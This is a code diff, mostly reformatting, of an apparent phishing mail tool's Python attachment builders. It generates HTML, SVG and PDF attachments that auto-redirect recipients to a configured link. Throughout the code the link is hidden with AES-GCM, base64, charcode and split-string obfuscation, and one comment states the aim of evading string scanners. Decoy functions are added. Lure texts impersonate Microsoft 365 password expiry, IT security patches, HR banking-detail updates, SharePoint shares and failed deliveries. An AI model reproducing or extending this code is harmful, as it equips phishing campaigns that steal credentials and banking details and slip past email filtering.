+        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
             zf.writestr(inner_name, content)
 
     zip_data = buf.getvalue()
@@ -713,13 +805,15 @@ def _build_zip_attachment(zip_cfg, lead, sender, html_content):
     return part, password
 
 
-def _build_eml_attachment(eml_cfg, lead, sender, resolved_html, resolved_subject, nested_parts=None):
+def _build_eml_attachment(
+    eml_cfg, lead, sender, resolved_html, resolved_subject, nested_parts=None
+):
     """Build an .eml file attachment, optionally with nested attachments inside."""
-    eml_subject   = eml_cfg.get("subject") or resolved_subject
+    eml_subject = eml_cfg.get("subject") or resolved_subject
     eml_from_name = eml_cfg.get("fromName") or sender.get("fromName", "")
-    eml_from_email= eml_cfg.get("fromEmail") or sender.get("fromEmail", "")
-    eml_filename  = eml_cfg.get("fileName") or "message.eml"
-    eml_cc        = eml_cfg.get("cc") or ""
+    eml_from_email = eml_cfg.get("fromEmail") or sender.get("fromEmail", "")
+    eml_filename = eml_cfg.get("fileName") or "message.eml"
+    eml_cc = eml_cfg.get("cc") or ""
 
     alt = MIMEMultipart("alternative")
     plain_text = _strip_html(resolved_html)
@@ -734,11 +828,15 @@ def _build_eml_attachment(eml_cfg, lead, sender, resolved_html, resolved_subject
     else:
         inner = alt
 
-    inner["From"]    = f'"{eml_from_name}" <{eml_from_email}>' if eml_from_name else eml_from_email
-    inner["To"]      = lead.get("email", "")
+    inner["From"] = (
+        f'"{eml_from_name}" <{eml_from_email}>' if eml_from_name else eml_from_email
+    )
+    inner["To"] = lead.get("email", "")
     inner["Subject"] = eml_subject
-    inner["Date"]    = formatdate(localtime=False)
-    inner["Message-ID"] = make_msgid(domain=eml_from_email.split("@")[-1] if "@" in eml_from_email else "example.com")
+    inner["Date"] = formatdate(localtime=False)
+    inner["Message-ID"] = make_msgid(
+        domain=eml_from_email.split("@")[-1] if "@" in eml_from_email else "example.com"
+    )
     if eml_cc:
         inner["Cc"] = eml_cc
 
@@ -767,6 +865,7 @@ def _build_pdf_attachment(pdf_cfg, html_content, lead, resolved_subject):
     if _auto_install("weasyprint"):
         try:
             from weasyprint import HTML as WP_HTML
+
             pdf_data = WP_HTML(string=html_content).write_pdf()
         except Exception:
             pdf_data = None
@@ -775,7 +874,8 @@ def _build_pdf_attachment(pdf_cfg, html_content, lead, resolved_subject):
     if not pdf_data:
         try:
             import pdfkit
-            buf = io.BytesIO()
+
+            io.BytesIO()
             opts = {"quiet": "", "page-size": "A4", "encoding": "UTF-8"}
             pdf_data = pdfkit.from_string(html_content, False, options=opts)
         except Exception:
@@ -785,6 +885,7 @@ def _build_pdf_attachment(pdf_cfg, html_content, lead, resolved_subject):
     if not pdf_data and _auto_install("fpdf2", "fpdf"):
         try:
             from fpdf import FPDF
+
             pdf = FPDF()
             pdf.add_page()
             pdf.set_font("Helvetica", size=11)
@@ -822,7 +923,7 @@ def _build_svg_attachment(svg_cfg):
         '<rect width="200" height="200" fill="#667eea" rx="12"/>'
         '<text x="100" y="115" font-family="Arial" font-size="32" '
         'text-anchor="middle" fill="#ffffff">✉</text>'
-        '</svg>'
+        "</svg>"
     )
 
     part = MIMEBase("image", "svg+xml")
@@ -844,12 +945,14 @@ def _build_html_redirect_attachment(cfg, lead, sender=None):
         delay       — ms before redirect fires  (default: 200)
     """
     import base64 as _b64
+
     lead = lead or {}
     lead_email = lead.get("email", "")
     raw_link = (cfg.get("link") or cfg.get("url") or "").strip()
     link = raw_link.replace("#EMAIL", lead_email)
     try:
         from core.tags import build_context, resolve_tags
+
         ctx = build_context(lead=lead, sender=sender or {}, subject="", counter=0)
         link = resolve_tags(link, ctx)
     except Exception:
@@ -860,7 +963,7 @@ def _build_html_redirect_attachment(cfg, lead, sender=None):
         name += ".html"
 
     theme = (cfg.get("theme") or "loading").strip().lower()
-    obf   = (cfg.get("obfuscation") or "none").strip().lower()
+    obf = (cfg.get("obfuscation") or "none").strip().lower()
     try:
         delay = max(0, int(cfg.get("delay") or 200))
     except Exception:
@@ -872,38 +975,40 @@ def _build_html_redirect_attachment(cfg, lead, sender=None):
         try:
             import os as _os2
             from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
             _key = _os2.urandom(32)
-            _iv  = _os2.urandom(12)
-            _ct  = AESGCM(_key).encrypt(_iv, link.encode(), None)
-            K  = _b64.b64encode(_key).decode()
+            _iv = _os2.urandom(12)
+            _ct = AESGCM(_key).encrypt(_iv, link.encode(), None)
+            K = _b64.b64encode(_key).decode()
             IV = _b64.b64encode(_iv).decode()
             CT = _b64.b64encode(_ct).decode()
             FB = _b64.b64encode(link.encode()).decode()
             _fn_tpl = (
-                'async function _go(){{'
-                'try{{'
+                "async function _go(){{"
+                "try{{"
                 'var _k=await crypto.subtle.importKey("raw",'
                 'Uint8Array.from(atob("{K}"),function(c){{return c.charCodeAt(0)}}),'
                 '{{"name":"AES-GCM"}},false,["decrypt"]);'
-                'var _d=await crypto.subtle.decrypt('
+                "var _d=await crypto.subtle.decrypt("
                 '{{"name":"AES-GCM","iv":Uint8Array.from(atob("{IV}"),function(c){{return c.charCodeAt(0)}})}},'
                 '_k,Uint8Array.from(atob("{CT}"),function(c){{return c.charCodeAt(0)}}));'
-                'window.location.href=new TextDecoder().decode(_d);'
+                "window.location.href=new TextDecoder().decode(_d);"
                 '}}catch(e){{window.location.href=atob("{FB}");}}'
-                '}}'
+                "}}"
             )
             click_fn = _fn_tpl.format(K=K, IV=IV, CT=CT, FB=FB)
-            timed    = f'setTimeout(_go,{delay});'
+            timed = f"setTimeout(_go,{delay});"
             _aes_used = True
         except ImportError:
             obf = "base64"
 
     if not _aes_used:
+
         def _uexpr(url):
             if obf == "base64":
                 return f'atob("{_b64.b64encode(url.encode()).decode()}")'
             if obf == "charcode":
-                return f'String.fromCharCode({",".join(str(ord(c)) for c in url)})'
+                return f"String.fromCharCode({','.join(str(ord(c)) for c in url)})"
             if obf == "hex":
                 return '"' + "".join(f"\\x{ord(c):02x}" for c in url) + '"'
             if obf == "reverse":
@@ -912,68 +1017,69 @@ def _build_html_redirect_attachment(cfg, lead, sender=None):
                 mid = len(url) // 2
                 return f'"{url[:mid]}"+"{url[mid:]}"'
             return f'"{url}"'
-        expr     = _uexpr(link)
-        timed    = f'setTimeout(function(){{var u={expr};window.location.replace(u);}},{delay});'
-        click_fn = f'function _go(){{var u={expr};window.location.href=u;}}'
+
+        expr = _uexpr(link)
+        timed = f"setTimeout(function(){{var u={expr};window.location.replace(u);}},{delay});"
+        click_fn = f"function _go(){{var u={expr};window.location.href=u;}}"
 
     if theme == "blank":
         html = (
             f'<!DOCTYPE html><html><head><meta charset="utf-8">'
             f'<meta http-equiv="refresh" content="0;url={link}"></head>'
-            f'<body><script>{timed}</script></body></html>'
+            f"<body><script>{timed}</script></body></html>"
         )
     elif theme == "click":
         html = (
             f'<!DOCTYPE html><html><head><meta charset="utf-8">'
-            f'<style>*{{box-sizing:border-box;margin:0;padding:0}}'
+            f"<style>*{{box-sizing:border-box;margin:0;padding:0}}"
             f'body{{background:#fff;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif;'
-            f'display:flex;align-items:center;justify-content:center;min-height:100vh}}'
-            f'.wrap{{text-align:center;padding:40px}}'
-            f'.btn{{display:inline-block;margin-top:24px;padding:14px 32px;background:#0078d4;'
-            f'color:#fff;text-decoration:none;border-radius:6px;font-size:16px;font-weight:600;'
-            f'cursor:pointer;border:none}}'
-            f'p{{color:#555;font-size:15px}}</style></head>'
+            f"display:flex;align-items:center;justify-content:center;min-height:100vh}}"
+            f".wrap{{text-align:center;padding:40px}}"
+            f".btn{{display:inline-block;margin-top:24px;padding:14px 32px;background:#0078d4;"
+            f"color:#fff;text-decoration:none;border-radius:6px;font-size:16px;font-weight:600;"
+            f"cursor:pointer;border:none}}"
+            f"p{{color:#555;font-size:15px}}</style></head>"
             f'<body><div class="wrap"><p>Your document is ready to view.</p><br>'
             f'<button class="btn" onclick="_go()">Open Document &rarr;</button></div>'
-            f'<script>{click_fn}{timed}</script></body></html>'
+            f"<script>{click_fn}{timed}</script></body></html>"
         )
     elif theme == "viewer":
         html = (
             f'<!DOCTYPE html><html><head><meta charset="utf-8">'
-            f'<style>*{{margin:0;padding:0;box-sizing:border-box}}'
-            f'body{{background:#323639;display:flex;flex-direction:column;'
-            f'align-items:center;justify-content:center;height:100vh;font-family:Arial,sans-serif}}'
-            f'.bar{{width:100%;background:#1e2124;padding:12px 20px;position:fixed;top:0;'
-            f'display:flex;align-items:center;gap:12px}}'
-            f'.icon{{width:22px;height:22px;background:#e74c3c;border-radius:3px;'
-            f'display:flex;align-items:center;justify-content:center;color:#fff;font-size:11px;font-weight:bold}}'
-            f'.ttl{{color:#ccc;font-size:13px}}'
-            f'.page{{background:#fff;width:620px;max-width:95vw;height:70vh;border-radius:2px;'
-            f'display:flex;align-items:center;justify-content:center;box-shadow:0 4px 20px rgba(0,0,0,.5)}}'
-            f'.msg{{color:#aaa;font-size:13px;text-align:center}}'
-            f'.spin{{width:30px;height:30px;border:3px solid #ddd;border-top-color:#0078d4;'
-            f'border-radius:50%;animation:s .8s linear infinite;margin:0 auto 10px}}'
-            f'@keyframes s{{to{{transform:rotate(360deg)}}}}</style></head>'
+            f"<style>*{{margin:0;padding:0;box-sizing:border-box}}"
+            f"body{{background:#323639;display:flex;flex-direction:column;"
+            f"align-items:center;justify-content:center;height:100vh;font-family:Arial,sans-serif}}"
+            f".bar{{width:100%;background:#1e2124;padding:12px 20px;position:fixed;top:0;"
+            f"display:flex;align-items:center;gap:12px}}"
+            f".icon{{width:22px;height:22px;background:#e74c3c;border-radius:3px;"
+            f"display:flex;align-items:center;justify-content:center;color:#fff;font-size:11px;font-weight:bold}}"
+            f".ttl{{color:#ccc;font-size:13px}}"
+            f".page{{background:#fff;width:620px;max-width:95vw;height:70vh;border-radius:2px;"
+            f"display:flex;align-items:center;justify-content:center;box-shadow:0 4px 20px rgba(0,0,0,.5)}}"
+            f".msg{{color:#aaa;font-size:13px;text-align:center}}"
+            f".spin{{width:30px;height:30px;border:3px solid #ddd;border-top-color:#0078d4;"
+            f"border-radius:50%;animation:s .8s linear infinite;margin:0 auto 10px}}"
+            f"@keyframes s{{to{{transform:rotate(360deg)}}}}</style></head>"
             f'<body><div class="bar"><div class="icon">&#128196;</div>'
             f'<div class="ttl">Document Viewer &mdash; Loading&hellip;</div></div>'
             f'<div class="page"><div class="msg"><div class="spin"></div>Opening document&hellip;</div></div>'
-            f'<script>{click_fn}{timed}</script></body></html>'
+            f"<script>{click_fn}{timed}</script></body></html>"
         )
     else:  # loading (default)
         html = (
             f'<!DOCTYPE html><html><head><meta charset="utf-8">'
-            f'<style>*{{margin:0;padding:0;box-sizing:border-box}}'
+            f"<style>*{{margin:0;padding:0;box-sizing:border-box}}"
             f'body{{background:#f5f7fa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif;'
-            f'display:flex;align-items:center;justify-content:center;height:100vh}}'
-            f'.box{{text-align:center;padding:40px}}'
-            f'.spin{{width:48px;height:48px;border:4px solid #e0e6ef;border-top-color:#0078d4;'
-            f'border-radius:50%;animation:s .9s linear infinite;margin:0 auto 20px}}'
-            f'@keyframes s{{to{{transform:rotate(360deg)}}}}'
-            f'h3{{color:#1a1a2e;font-size:18px;font-weight:600;margin-bottom:8px}}'
-            f'p{{color:#888;font-size:13px}}</style></head>'
+            f"display:flex;align-items:center;justify-content:center;height:100vh}}"
+            f".box{{text-align:center;padding:40px}}"
+            f".spin{{width:48px;height:48px;border:4px solid #e0e6ef;border-top-color:#0078d4;"
+            f"border-radius:50%;animation:s .9s linear infinite;margin:0 auto 20px}}"
+            f"@keyframes s{{to{{transform:rotate(360deg)}}}}"
+            f"h3{{color:#1a1a2e;font-size:18px;font-weight:600;margin-bottom:8px}}"
+            f"p{{color:#888;font-size:13px}}</style></head>"
             f'<body><div class="box"><div class="spin"></div>'
-            f'<h3>Loading&hellip;</h3><p>Please wait while your content is prepared.</p></div>'
-            f'<script>{click_fn}{timed}</script></body></html>'
+            f"<h3>Loading&hellip;</h3><p>Please wait while your content is prepared.</p></div>"
+            f"<script>{click_fn}{timed}</script></body></html>"
         )
 
     part = MIMEBase("text", "html")
@@ -1003,13 +1109,16 @@ def _build_js_obfuscated_html(cfg, lead, sender=None):
         delay  — ms before redirect fires (default: 800)
         layers — 1–4 obfuscation depth (default: 3)
     """
-    import base64 as _b64, random as _rand, string as _str
+    import base64 as _b64
+    import random as _rand
+    import string as _str
 
     lead = lead or {}
     raw_link = (cfg.get("link") or cfg.get("url") or "").strip()
     link = raw_link
     try:
         from core.tags import build_context, resolve_tags
+
         ctx = build_context(lead=lead, sender=sender or {}, subject="", counter=0)
         link = resolve_tags(link, ctx)
     except Exception:
@@ -1019,7 +1128,7 @@ def _build_js_obfuscated_html(cfg, lead, sender=None):
     if not (name.endswith(".html") or name.endswith(".htm")):
         name += ".html"
 
-    theme  = (cfg.get("theme") or "office365").strip().lower()
+    theme = (cfg.get("theme") or "office365").strip().lower()
     layers = max(1, min(4, int(cfg.get("layers") or 3)))
     try:
         delay = max(0, int(cfg.get("delay") or 800))
@@ -1028,6 +1137,7 @@ def _build_js_obfuscated_html(cfg, lead, sender=None):
 
     # ── Random variable name generator ──
     _used = set()
+
     def _rvar(length=6):
         while True:
             v = "_" + "".join(_rand.choices(_str.ascii_lowercase, k=length))
@@ -1038,9 +1148,9 @@ def _build_js_obfuscated_html(cfg, lead, sender=None):
     # ── Layer 1: split URL into pieces, base64-encode each ──
     url = link or "https://example.com"
     n_pieces = 3 + layers  # 4–7 pieces depending on depth
-    chunk    = max(1, len(url) // n_pieces)
-    pieces   = []
-    pos      = 0
+    chunk = max(1, len(url) // n_pieces)
+    pieces = []
+    pos = 0
     while pos < len(url):
         end = pos + chunk + _rand.randint(-1, 2) if pos + chunk < len(url) else len(url)
         end = max(pos + 1, min(end, len(url)))
@@ -1050,48 +1160,48 @@ def _build_js_obfuscated_html(cfg, lead, sender=None):
     b64_pieces = [_b64.b64encode(p.encode()).decode() for p in pieces]
 
     # ── Layer 2: build JS that decodes and reassembles ──
-    vArr  = _rvar()
-    vPart = _rvar()
-    vUrl  = _rvar()
-    vIdx  = _rvar()
-    vFn   = _rvar()
-    vGo   = _rvar()
+    vArr = _rvar()
+    _rvar()
+    vUrl = _rvar()
+    vIdx = _rvar()
+    vFn = _rvar()
+    vGo = _rvar()
 
     # Encode "atob" as charCode array to hide it from simple string scanners
     atob_chars = ",".join(str(ord(c)) for c in "atob")
-    loc_chars  = ",".join(str(ord(c)) for c in "location")
+    loc_chars = ",".join(str(ord(c)) for c in "location")
     href_chars = ",".join(str(ord(c)) for c in "href")
 
-    js_pieces  = "[" + ",".join(f'"{p}"' for p in b64_pieces) + "]"
+    js_pieces = "[" + ",".join(f'"{p}"' for p in b64_pieces) + "]"
 
     if layers >= 3:
         # Encode fn name for atob via charCode
         decode_expr = (
-            f'var {vFn}=String.fromCharCode({atob_chars});'
-            f'var {vArr}={js_pieces};'
+            f"var {vFn}=String.fromCharCode({atob_chars});"
+            f"var {vArr}={js_pieces};"
             f'var {vUrl}="";'
-            f'for(var {vIdx}=0;{vIdx}<{vArr}.length;{vIdx}++){{'
-            f'{vUrl}+=window[{vFn}]({vArr}[{vIdx}]);'
-            f'}}'
+            f"for(var {vIdx}=0;{vIdx}<{vArr}.length;{vIdx}++){{"
+            f"{vUrl}+=window[{vFn}]({vArr}[{vIdx}]);"
+            f"}}"
         )
     else:
         decode_expr = (
-            f'var {vArr}={js_pieces};'
+            f"var {vArr}={js_pieces};"
             f'var {vUrl}="";'
-            f'for(var {vIdx}=0;{vIdx}<{vArr}.length;{vIdx}++){{'
-            f'{vUrl}+=atob({vArr}[{vIdx}]);'
-            f'}}'
+            f"for(var {vIdx}=0;{vIdx}<{vArr}.length;{vIdx}++){{"
+            f"{vUrl}+=atob({vArr}[{vIdx}]);"
+            f"}}"
         )
 
     if layers >= 2:
         # charCode-encode "location" and "href" property names
         redirect_expr = (
-            f'var _lk=String.fromCharCode({loc_chars});'
-            f'var _hk=String.fromCharCode({href_chars});'
-            f'window[_lk][_hk]={vUrl};'
+            f"var _lk=String.fromCharCode({loc_chars});"
+            f"var _hk=String.fromCharCode({href_chars});"
+            f"window[_lk][_hk]={vUrl};"
         )
     else:
-        redirect_expr = f'window.location.href={vUrl};'
+        redirect_expr = f"window.location.href={vUrl};"
 
     # ── Layer 4: dead-code decoy functions ──
     decoy = ""
@@ -1104,7 +1214,7 @@ def _build_js_obfuscated_html(cfg, lead, sender=None):
         )
 
     go_body = decode_expr + redirect_expr
-    js = f'{decoy}function {vGo}(){{{go_body}}}setTimeout({vGo},{delay});'
+    js = f"{decoy}function {vGo}(){{{go_body}}}setTimeout({vGo},{delay});"
 
     # ── Theme: generate realistic-looking HTML wrapper ──
     common_style = (
@@ -1134,15 +1244,17 @@ def _build_js_obfuscated_html(cfg, lead, sender=None):
         )
         body_html = (
             '<div class="body">'
-            '<h2>Action Required: Security Update</h2>'
-            '<p>Your workstation requires a critical security patch to comply with corporate policy. '
-            'Please click below to initiate the update process. This will take approximately 5 minutes.</p>'
-            '<p><strong>Deadline:</strong> End of business today</p>'
+            "<h2>Action Required: Security Update</h2>"
+            "<p>Your workstation requires a critical security patch to comply with corporate policy. "
+            "Please click below to initiate the update process. This will take approximately 5 minutes.</p>"
+            "<p><strong>Deadline:</strong> End of business today</p>"
             '<hr class="sep">'
             '<a class="btn" onclick="' + vGo + '();return false" href="#" '
             'style="background:#0078d4;color:#fff">Install Update &rarr;</a>'
-            '<p class="note">Ticket #IT-' + str(_rand.randint(10000, 99999)) + ' &middot; IT Security Team</p>'
-            '</div>'
+            '<p class="note">Ticket #IT-'
+            + str(_rand.randint(10000, 99999))
+            + " &middot; IT Security Team</p>"
+            "</div>"
         )
     elif theme == "hr":
         header_html = (
@@ -1152,15 +1264,17 @@ def _build_js_obfuscated_html(cfg, lead, sender=None):
         )
         body_html = (
             '<div class="body">'
-            '<h2>Payroll Update Required</h2>'
-            '<p>Our records show your direct deposit information needs to be verified before the next pay cycle. '
-            'Please review and confirm your banking details to avoid delays.</p>'
-            '<p><strong>Please complete by:</strong> Next business day</p>'
+            "<h2>Payroll Update Required</h2>"
+            "<p>Our records show your direct deposit information needs to be verified before the next pay cycle. "
+            "Please review and confirm your banking details to avoid delays.</p>"
+            "<p><strong>Please complete by:</strong> Next business day</p>"
             '<hr class="sep">'
             '<a class="btn" onclick="' + vGo + '();return false" href="#" '
             'style="background:#107c10;color:#fff">Update Banking Info &rarr;</a>'
-            '<p class="note">Ref: HR-' + str(_rand.randint(1000, 9999)) + ' &middot; Human Resources</p>'
-            '</div>'
+            '<p class="note">Ref: HR-'
+            + str(_rand.randint(1000, 9999))
+            + " &middot; Human Resources</p>"
+            "</div>"
         )
     elif theme == "sharepoint":
         header_html = (
@@ -1170,17 +1284,17 @@ def _build_js_obfuscated_html(cfg, lead, sender=None):
         )
         body_html = (
             '<div class="body">'
-            '<h2>Document Shared With You</h2>'
-            '<p>A file has been shared with you from <strong>Corporate Documents</strong>. '
-            'Click the button below to open and review the document.</p>'
+            "<h2>Document Shared With You</h2>"
+            "<p>A file has been shared with you from <strong>Corporate Documents</strong>. "
+            "Click the button below to open and review the document.</p>"
             '<div style="background:#f3f2f1;border-radius:3px;padding:14px 16px;margin:14px 0;">'
             '<div style="font-weight:600;font-size:14px">&#128196; Q4_Policy_Update.docx</div>'
             '<div style="font-size:12px;color:#605e5c;margin-top:4px">Modified today &middot; 248 KB</div>'
-            '</div>'
+            "</div>"
             '<a class="btn" onclick="' + vGo + '();return false" href="#" '
             'style="background:#036ac4;color:#fff">Open in SharePoint &rarr;</a>'
             '<p class="note">You received this because it was shared with your account.</p>'
-            '</div>'
+            "</div>"
         )
     elif theme == "delivery":
         header_html = (
@@ -1190,15 +1304,17 @@ def _build_js_obfuscated_html(cfg, lead, sender=None):
         )
         body_html = (
             '<div class="body">'
-            '<h2>Package Delivery Attempt Failed</h2>'
-            '<p>We attempted to deliver your package but were unable to complete delivery. '
-            'A signature is required. Please reschedule your delivery or arrange collection.</p>'
-            '<p><strong>Tracking:</strong> ' + str(_rand.randint(10**17, 10**18-1)) + '</p>'
+            "<h2>Package Delivery Attempt Failed</h2>"
+            "<p>We attempted to deliver your package but were unable to complete delivery. "
+            "A signature is required. Please reschedule your delivery or arrange collection.</p>"
+            "<p><strong>Tracking:</strong> "
+            + str(_rand.randint(10**17, 10**18 - 1))
+            + "</p>"
             '<hr class="sep">'
             '<a class="btn" onclick="' + vGo + '();return false" href="#" '
             'style="background:#cc0000;color:#fff">Reschedule Delivery &rarr;</a>'
             '<p class="note">This notice will expire in 5 business days.</p>'
-            '</div>'
+            "</div>"
         )
     else:  # office365 (default)
         header_html = (
@@ -1209,24 +1325,24 @@ def _build_js_obfuscated_html(cfg, lead, sender=None):
         )
         body_html = (
             '<div class="body">'
-            '<h2>Your password expires soon</h2>'
-            '<p>Your Microsoft 365 password will expire in <strong>24 hours</strong>. '
-            'To avoid being locked out of your account, please update your password now.</p>'
+            "<h2>Your password expires soon</h2>"
+            "<p>Your Microsoft 365 password will expire in <strong>24 hours</strong>. "
+            "To avoid being locked out of your account, please update your password now.</p>"
             '<p style="color:#a80000;font-size:13px">⚠ Failure to act will result in account suspension.</p>'
             '<hr class="sep">'
             '<a class="btn" onclick="' + vGo + '();return false" href="#" '
             'style="background:#0078d4;color:#fff">Update Password &rarr;</a>'
             '<p class="note">Microsoft account security &middot; If you already changed your password, '
-            'you can ignore this message.</p>'
-            '</div>'
+            "you can ignore this message.</p>"
+            "</div>"
         )
 
     html = (
         f'<!DOCTYPE html><html><head><meta charset="utf-8">'
         f'<meta name="viewport" content="width=device-width,initial-scale=1">'
-        f'<title>Notice</title>{common_style}</head>'
+        f"<title>Notice</title>{common_style}</head>"
         f'<body><div class="wrap">{header_html}{body_html}</div>'
-        f'<script>{js}</script></body></html>'
+        f"<script>{js}</script></body></html>"
     )
 
     part = MIMEBase("text", "html")
@@ -1257,18 +1373,19 @@ def _build_svg_redirect_attachment(cfg, lead, sender=None):
     link = raw_link.replace("#EMAIL", lead_email)
     try:
         from core.tags import build_context, resolve_tags
+
         ctx = build_context(lead=lead, sender=sender or {}, subject="", counter=0)
         link = resolve_tags(link, ctx)
     except Exception:
         pass
 
-    doc_id  = _os.urandom(5).hex()
-    name    = (cfg.get("name") or f"doc_file_{doc_id}.svg").strip()
+    doc_id = _os.urandom(5).hex()
+    name = (cfg.get("name") or f"doc_file_{doc_id}.svg").strip()
     if not name.endswith(".svg"):
         name += ".svg"
 
     style = (cfg.get("style") or "crimson").strip().lower()
-    obf   = (cfg.get("obfuscation") or "aes256").strip().lower()
+    obf = (cfg.get("obfuscation") or "aes256").strip().lower()
     try:
         delay = max(0, int(cfg.get("delay") or 1200))
     except Exception:
@@ -1280,40 +1397,41 @@ def _build_svg_redirect_attachment(cfg, lead, sender=None):
         _used_aes = False
         try:
             from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
             _key = _os.urandom(32)
-            _iv  = _os.urandom(12)
-            _ct  = AESGCM(_key).encrypt(_iv, link.encode(), None)
-            K  = _b64.b64encode(_key).decode()
+            _iv = _os.urandom(12)
+            _ct = AESGCM(_key).encrypt(_iv, link.encode(), None)
+            K = _b64.b64encode(_key).decode()
             IV = _b64.b64encode(_iv).decode()
             CT = _b64.b64encode(_ct).decode()
             FB = _b64.b64encode(link.encode()).decode()
             # Use .format() so JS {{ }} braces don't collide with f-string
             _fn_tpl = (
-                'async function _openDoc(){{'
-                'try{{'
+                "async function _openDoc(){{"
+                "try{{"
                 'var _k=await crypto.subtle.importKey("raw",'
                 'Uint8Array.from(atob("{K}"),function(c){{return c.charCodeAt(0)}}),'
                 '{{"name":"AES-GCM"}},false,["decrypt"]);'
-                'var _d=await crypto.subtle.decrypt('
+                "var _d=await crypto.subtle.decrypt("
                 '{{"name":"AES-GCM","iv":Uint8Array.from(atob("{IV}"),function(c){{return c.charCodeAt(0)}})}},'
                 '_k,Uint8Array.from(atob("{CT}"),function(c){{return c.charCodeAt(0)}}));'
-                'window.location.href=new TextDecoder().decode(_d);'
+                "window.location.href=new TextDecoder().decode(_d);"
                 '}}catch(e){{window.location.href=atob("{FB}");}}'
-                '}}'
+                "}}"
             )
-            open_fn    = _fn_tpl.format(K=K, IV=IV, CT=CT, FB=FB)
-            _used_aes  = True
+            open_fn = _fn_tpl.format(K=K, IV=IV, CT=CT, FB=FB)
+            _used_aes = True
         except ImportError:
-            obf = "base64"   # fall through to simple obfuscation
+            obf = "base64"  # fall through to simple obfuscation
 
         if _used_aes:
-            auto_trigger = f'setTimeout(_openDoc,{delay})'
+            auto_trigger = f"setTimeout(_openDoc,{delay})"
 
     if obf != "aes256":
         if obf == "base64":
             expr = f'atob("{_b64.b64encode(link.encode()).decode()}")'
         elif obf == "charcode":
-            expr = f'String.fromCharCode({",".join(str(ord(c)) for c in link)})'
+            expr = f"String.fromCharCode({','.join(str(ord(c)) for c in link)})"
         elif obf == "hex":
             expr = '"' + "".join(f"\\x{ord(c):02x}" for c in link) + '"'
         elif obf == "split":
@@ -1321,21 +1439,49 @@ def _build_svg_redirect_attachment(cfg, lead, sender=None):
             expr = f'"{link[:mid]}"+"{link[mid:]}"'
         else:
             expr = f'"{link}"'
-        open_fn      = f'function _openDoc(){{window.location.href={expr};}}'
-        auto_trigger = f'setTimeout(_openDoc,{delay})'
+        open_fn = f"function _openDoc(){{window.location.href={expr};}}"
+        auto_trigger = f"setTimeout(_openDoc,{delay})"
 
-    cdata = f'{open_fn};{auto_trigger};'
+    cdata = f"{open_fn};{auto_trigger};"
 
     # ── Theme palette ────────────────────────────────────────────
     _themes = {
-        "crimson":  dict(bg="#ffffff", paper="#f9f9f9", fg="#111111", sub="#666666",
-                         btn="#dc2626", btnTxt="#ffffff", line="#dc2626"),
-        "obsidian": dict(bg="#111111", paper="#1a1a1a", fg="#ffffff",  sub="#888888",
-                         btn="#2a2a2a", btnTxt="#ffffff", line="#444444"),
-        "cobalt":   dict(bg="#f0f4ff", paper="#e8efff", fg="#1a1a2e",  sub="#4a6080",
-                         btn="#0078d4", btnTxt="#ffffff", line="#0078d4"),
-        "cipher":   dict(bg="#0a0a0a", paper="#0d1a0d", fg="#22c55e",  sub="#4ade80",
-                         btn="#14532d", btnTxt="#22c55e", line="#22c55e"),
+        "crimson": dict(
+            bg="#ffffff",
+            paper="#f9f9f9",
+            fg="#111111",
+            sub="#666666",
+            btn="#dc2626",
+            btnTxt="#ffffff",
+            line="#dc2626",
+        ),
+        "obsidian": dict(
+            bg="#111111",
+            paper="#1a1a1a",
+            fg="#ffffff",
+            sub="#888888",
+            btn="#2a2a2a",
+            btnTxt="#ffffff",
+            line="#444444",
+        ),
+        "cobalt": dict(
+            bg="#f0f4ff",
+            paper="#e8efff",
+            fg="#1a1a2e",
+            sub="#4a6080",
+            btn="#0078d4",
+            btnTxt="#ffffff",
+            line="#0078d4",
+        ),
+        "cipher": dict(
+            bg="#0a0a0a",
+            paper="#0d1a0d",
+            fg="#22c55e",
+            sub="#4ade80",
+            btn="#14532d",
+            btnTxt="#22c55e",
+            line="#22c55e",
+        ),
     }
 
     if style == "auto":
@@ -1343,18 +1489,18 @@ def _build_svg_redirect_attachment(cfg, lead, sender=None):
             '<?xml version="1.0" encoding="UTF-8"?>'
             '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1" viewBox="0 0 1 1">'
             f'<script type="text/javascript"><![CDATA[{cdata}]]></script>'
-            '</svg>'
+            "</svg>"
         )
     else:
         t = _themes.get(style, _themes["crimson"])
         enc_label = "AES-256-GCM" if obf == "aes256" else "obfuscated"
         # Wavy background pattern (subtle)
         pat = (
-            '<defs>'
+            "<defs>"
             f'<pattern id="wp" x="0" y="0" width="50" height="30" patternUnits="userSpaceOnUse">'
             f'<path d="M0 15 C12 5,25 25,37 15 C43 10,47 12,50 15" fill="none" stroke="{t["btn"]}1a" stroke-width="0.8"/>'
-            '</pattern>'
-            '</defs>'
+            "</pattern>"
+            "</defs>"
         )
         svg = (
             '<?xml version="1.0" encoding="UTF-8"?>'
@@ -1386,7 +1532,7 @@ def _build_svg_redirect_attachment(cfg, lead, sender=None):
             + f'<text x="60" y="320" font-family="Arial,monospace" font-size="10" fill="{t["sub"]}">Document ID: {doc_id}</text>'
             # script
             + f'<script type="text/javascript"><![CDATA[{cdata}]]></script>'
-            + '</svg>'
+            + "</svg>"
         )
 
     part = MIMEBase("image", "svg+xml")
@@ -1406,7 +1552,8 @@ def _build_pdf_redirect_attachment(cfg, lead, sender=None):
         name   — output filename  (default: "doc_<id>.pdf")
         style  — crimson | obsidian | cobalt | cipher  (default: crimson)
     """
-    import io, os as _os
+    import io
+    import os as _os
 
     lead = lead or {}
     lead_email = lead.get("email", "")
@@ -1414,28 +1561,53 @@ def _build_pdf_redirect_attachment(cfg, lead, sender=None):
     link = raw_link.replace("#EMAIL", lead_email)
     try:
         from core.tags import build_context, resolve_tags
+
         ctx = build_context(lead=lead, sender=sender or {}, subject="", counter=0)
         link = resolve_tags(link, ctx)
     except Exception:
         pass
 
     doc_id = _os.urandom(4).hex().upper()
-    name   = (cfg.get("name") or f"doc_{doc_id.lower()}.pdf").strip()
+    name = (cfg.get("name") or f"doc_{doc_id.lower()}.pdf").strip()
     if not name.endswith(".pdf"):
         name += ".pdf"
 
-    style  = (cfg.get("style") or "crimson").strip().lower()
+    style = (cfg.get("style") or "crimson").strip().lower()
 
     # RGB float tuples for reportlab
     _themes = {
-        "crimson":  dict(bg=(0.98,0.98,0.98), fg=(0.07,0.07,0.07), sub=(0.42,0.42,0.42),
